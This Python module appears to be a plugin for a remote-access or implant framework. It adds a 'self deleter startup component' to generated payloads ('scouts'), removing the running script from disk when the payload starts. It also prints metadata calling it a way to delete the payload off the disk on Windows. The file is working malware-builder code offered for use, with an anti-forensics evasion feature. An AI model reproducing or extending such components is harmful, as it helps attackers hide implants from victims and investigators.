# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from os import path, remove')
        self.config.import_statements.append('from sys import argv')
        self.config.startup_end.append('self_delete_startup()')
        self.config.functions.append('''
def self_delete_startup():
    remove(path.abspath(argv[0]))
''')
    elif option == 'info':
        self.log.blank('\nName             : Self deleter startup component' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : os, sys' \
                       '\nCommands         : NIL (Runs at startup)' \
                       '\nDescription      : Deletes the payload off the disk' \
                       '\nNote             : Persistence library will NOT work due to the file being deleted off of disk' \
                       '\n                   This will cause the scout (when compiled to EXE) to error out due to the inability to delete EXEs that are running, it is limited to only python scripts\n')
        return {
                "Name": "Self deleter startup component",
                "OS": "Windows",
                "Required Modules": "os, sys",
                "Commands": "NIL (Runs at startup)",
                "Description": "Deletes the payload off the disk"}